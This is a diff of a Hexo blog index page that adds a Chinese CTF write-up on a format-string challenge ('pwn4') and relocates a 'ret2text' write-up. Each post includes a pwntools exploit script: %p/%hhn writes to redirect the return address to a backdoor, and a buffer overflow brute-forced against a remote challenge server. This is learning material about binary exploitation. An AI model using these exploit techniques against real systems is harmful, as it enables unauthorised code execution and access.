@@ -128,7 +128,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -154,6 +154,99 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/14/2025-12-14-pwn4%EF%BC%88Format%20String%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/12/14/2025-12-14-pwn4%EF%BC%88Format%20String%EF%BC%89/" class="post-title-link" itemprop="url">CTF题解：Format String</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-12-14 19:29:00 / Modified: 19:43:19" itemprop="dateCreated datePublished" datetime="2025-12-14T19:29:00+08:00">2025-12-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="pwn4（Format-String）"><a href="#pwn4（Format-String）" class="headerlink" title="pwn4（Format String）"></a>pwn4（Format String）</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p>![image-20251214104847251](\image25-12-14-pwn4(Format String)\checksec.png)</p>
+<p>![image-20251214105053214](\image25-12-14-pwn4(Format String)\vuln.png)</p>
+<p>![image-20251214194047129](\image25-12-14-pwn4(Format String)\backdoor.png)</p>
+<p>有三次输入机会，向 buf 输入256字节，并且 printf 将 buf 当作参数，明显格式化字符串漏洞。因为没有 pie，尝试将返回地址修改为后门函数</p>
+<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><p>在第一次输入时打断</p>
+<p>![image-20251214105559934](\image25-12-14-pwn4(Format String)\stack.png)</p>
+<p>可以看到返回地址为 0x4012ba</p>
+<p>输入多个 %p 查看</p>
+<p>![屏幕截图 2025-12-14 105725](\image25-12-14-pwn4(Format String)%p.png)</p>
+<p>第九个参数就是返回地址，我们需要通过 %c 和 %n 把这里修改为backdoor 地址 0x401205，并且只需要修改最低字节就可以</p>
+<p>因为 %n 是向对应地址写入，我们希望向 0x4012ba 对应的栈地址写入，但是通过泄露的数据可以看到，没有指向 0x4012ba 的地址0x7fffffffde18。</p>
+<p>再观察一下可以发现，我们能够修改 rbp 指向的值 0x7fffffffde20，将其最低字节覆盖为 0x18，这样就可以让 0x7fffffffde18出现在栈上，</p>
+<p>然后再一次通过 %n 写返回地址即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;%p.&quot;</span>*<span class="number">20</span> + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 3 chances.\n&quot;</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">rbp = sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).split(<span class="string">b&#x27;.&#x27;</span>)[<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(rbp) <span class="comment">#泄露栈地址</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">stack_byte = <span class="number">0x08</span> + <span class="built_in">int</span>(rbp[-<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_byte))</span><br><span class="line">payload2 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_byte).encode() + <span class="string">b&quot;c%6$hhn&quot;</span> <span class="comment">#写指向返回地址的栈地址</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 2 chances.\n&quot;</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">return_byte = <span class="number">0x05</span></span><br><span class="line">payload3 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(return_byte).encode() + <span class="string">b&quot;c%8$hhn&quot;</span> <span class="comment">#写返回地址</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 1 chances.\n&quot;</span>)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -696,6 +789,100 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/05/2025-12-07-ret2text/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/12/05/2025-12-07-ret2text/" class="post-title-link" itemprop="url">CTF题解：ret2text</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-05 10:00:00" itemprop="dateCreated datePublished" datetime="2025-12-05T10:00:00+08:00">2025-12-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-12-08 00:57:27" itemprop="dateModified" datetime="2025-12-08T00:57:27+08:00">2025-12-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p><img src="/images/ret2text/vuln.png" alt="image-20251201141623225"></p>
+<p><img src="/images/ret2text/printf.png" alt="image-20251201141553974"></p>
+<p>直接看反编译，如果local_c为0x1337c0de直接获得flag，并且gets读入无限制，通过填充local_58去覆盖local_c即可</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python代码</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34540</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">70</span>, <span class="number">80</span>):</span><br><span class="line">    sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34540</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Enter Dexter\&#x27;s password: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*i + p32(<span class="number">0x1337c0de</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    response = sh.recvline()</span><br><span class="line">    sh.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Access granted&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Success! Offset = <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 获取flag</span></span><br><span class="line">        sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行结果</p>
+<p><img src="/images/ret2text/flag.png" alt="image-20251201142722954"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/05/2025-12-07-fmt/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -814,100 +1001,6 @@
 
 <p>运行结果</p>
 <p><img src="/images/fmt/flag.png" alt="image-20251201154503256"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/05/2025-12-07-ret2text/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hexo">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/12/05/2025-12-07-ret2text/" class="post-title-link" itemprop="url">CTF题解：ret2text</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2025-12-05 10:00:00" itemprop="dateCreated datePublished" datetime="2025-12-05T10:00:00+08:00">2025-12-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-12-08 00:57:27" itemprop="dateModified" datetime="2025-12-08T00:57:27+08:00">2025-12-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p><img src="/images/ret2text/vuln.png" alt="image-20251201141623225"></p>
-<p><img src="/images/ret2text/printf.png" alt="image-20251201141553974"></p>
-<p>直接看反编译，如果local_c为0x1337c0de直接获得flag，并且gets读入无限制，通过填充local_58去覆盖local_c即可</p>
-<p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python代码</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34540</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">70</span>, <span class="number">80</span>):</span><br><span class="line">    sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34540</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Enter Dexter\&#x27;s password: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*i + p32(<span class="number">0x1337c0de</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    response = sh.recvline()</span><br><span class="line">    sh.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Access granted&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Success! Offset = <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 获取flag</span></span><br><span class="line">        sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>运行结果</p>
-<p><img src="/images/ret2text/flag.png" alt="image-20251201142722954"></p>
 
       
     </div>
